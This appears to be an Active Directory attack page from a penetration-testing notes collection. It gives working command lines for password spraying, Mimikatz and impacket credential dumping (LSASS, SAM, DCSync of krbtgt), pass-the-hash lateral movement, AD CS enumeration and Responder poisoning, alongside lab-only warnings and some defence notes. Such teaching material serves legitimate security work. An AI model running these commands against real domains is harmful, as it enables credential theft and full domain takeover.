# 06 — Active Directory

Enumerate and attack Windows domains. The usual arc: get a first set of domain credentials (or a null session) → map the environment → harvest more credentials → move laterally → reach **Domain Admin** or forge tickets for domain persistence.

> Lab and authorized engagements only. Many techniques here are high-impact; pair each with the **detection/defense** note before using it anywhere real.

## Contents
- [Kerberos Tickets — Roasting, Pass-the-*, Golden & Silver](Kerberos-Tickets.md) — the full Kerberos attack chain, ending in golden/silver ticket forging.
- [Windows Server AD Lab Setup](Windows-Server-AD-Lab-Setup.md) — build a practice domain (OUs, users) with PowerShell.
- Escalation paths (AD CS / RBCD) are also in the [Pentesting Field Guide](../Pentesting-Field-Guide.md).

## The AD attack loop
1. **Enumerate** — users, groups, shares, GPOs, trusts, and the attack graph.
2. **Get a foothold credential** — password spray, responder, a web app, or a roastable account.
3. **Map paths** — BloodHound shows the shortest route to high-value objects.
4. **Harvest credentials** — LSASS, SAM, cached creds, LSA secrets, NTDS.
5. **Move laterally** — pass-the-hash / pass-the-ticket / overpass-the-hash.
6. **Dominate / persist** — DCSync, then golden/silver tickets.

---

## Enumeration & mapping

### BloodHound — AD attack-path mapping
- **Purpose:** graph relationships (sessions, ACLs, group membership, delegation) to find the shortest path to high-value objects.
- **Install:** BloodHound Community Edition; collect with `bloodhound-python` or SharpHound.
```bash
bloodhound-python -u user -p pass -d domain.local -ns 10.10.10.10 -c All --zip
```
- `-c All` — run all collection methods. `--zip` — bundle the JSON for import. `-ns` — the DC to query.

### netexec (nxc) & enum4linux-ng
- Credential validation, spraying, share/user enumeration — see [02-Enumeration](../02-Enumeration/README.md).

### kerbrute — user enumeration & spray
```bash
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Winter2026!'
```
- `userenum` — validate which usernames exist (quiet, via Kerberos pre-auth). `passwordspray` — one password against many users.

---

## Credential harvesting

### Mimikatz — the Windows credential toolkit
- **Purpose:** the canonical post-exploitation tool for extracting plaintext passwords, NTLM hashes, Kerberos tickets, and for forging tickets. Runs on a compromised Windows host (needs local admin / SYSTEM for most modules).
- **Why it was missing:** earlier revisions used the cross-platform **impacket** equivalents (which run from Linux). Mimikatz is the on-host Windows counterpart — both are included here now.
- **Source:** https://github.com/gentilkiwi/mimikatz  ·  Linux/cross-platform port: **pypykatz** (`pipx install pypykatz`).
- **Detection:** heavily signatured by AV/EDR. In a real engagement it is usually caught; use it knowingly in labs.

```text
mimikatz.exe
privilege::debug                 # enable SeDebugPrivilege (needed for LSASS access)
sekurlsa::logonpasswords         # dump plaintext creds + NTLM hashes from LSASS memory
sekurlsa::ekeys                  # dump Kerberos encryption keys (AES/RC4)
lsadump::sam                     # dump local SAM (local account NT hashes)
lsadump::lsa /patch              # dump LSA secrets
lsadump::dcsync /user:domain\krbtgt   # pull a user's hash from a DC via replication (DCSync)
```
**Command notes:**
- `privilege::debug` — grants the debug privilege so Mimikatz can read LSASS.
- `sekurlsa::logonpasswords` — the classic dump: cleartext passwords (where cached), NTLM, and Kerberos tickets for logged-on users.
- `sekurlsa::ekeys` — Kerberos keys, handy for overpass-the-hash.
- `lsadump::dcsync /user:...` — impersonates a DC and asks for a user's secrets; `/user:domain\krbtgt` grabs the key needed for a **golden ticket**.
- **Defense:** enable Credential Guard and LSASS protection (RunAsPPL), restrict local admin, and alert on LSASS access / replication from non-DC hosts.

### impacket-secretsdump — remote, from Linux
```bash
impacket-secretsdump domain.local/user:pass@10.10.10.50
impacket-secretsdump -just-dc-user krbtgt domain.local/user:pass@10.10.10.10
```
- `-just-dc` / `-just-dc-user <u>` — pull hashes from the DC's NTDS via DCSync (needs replication rights, e.g. Domain Admin). `-just-dc-user krbtgt` gets the key for golden tickets.

---

## Lateral movement

| Technique | Tool / command | Notes |
| --- | --- | --- |
| Pass-the-Hash | `impacket-psexec -hashes :NTHASH user@host` / `nxc smb host -u user -H NTHASH` | authenticate with the NT hash, no password |
| Remote exec | `impacket-wmiexec domain/user:pass@host` | stealthier than psexec (no service) |
| WinRM shell | `evil-winrm -i host -u user -p pass` (or `-H NTHASH`) | interactive PowerShell |
| Pass-the-Ticket | inject a `.ccache` / `.kirbi`, then `-k -no-pass` | see [Kerberos Tickets](Kerberos-Tickets.md) |

### evil-winrm
```bash
evil-winrm -i 10.10.10.50 -u user -p pass
evil-winrm -i 10.10.10.50 -u user -H <NTHASH>
```
- `-i` target, `-u` user, `-p` password or `-H` NT hash (pass-the-hash), `-s`/`-e` scripts/executables dirs for uploads.

---

## Domain escalation & persistence

- **AD CS (certificates):** `certipy find -u user@domain.local -p pass -dc-ip 10.10.10.10 -vulnerable -stdout` — enumerate ESC1–ESC8 misconfigurations.
- **Kerberos tickets:** roasting, pass-the-ticket, and **golden / silver ticket forging** have their own page → **[Kerberos-Tickets.md](Kerberos-Tickets.md)**.
- **Responder** (LLMNR/NBT-NS poisoning) and **spoofing** are prohibited in the OSCP exam — see [OSCP](../OSCP/).

### responder — LLMNR/NBT-NS poisoning (lab/authorized use)
```bash
sudo responder -I eth0 -wF
```
- `-I eth0` interface, `-w` WPAD rogue proxy, `-F` force NTLM on WPAD. Captures net-NTLM hashes for offline cracking. **Defense:** disable LLMNR/NBT-NS via GPO.
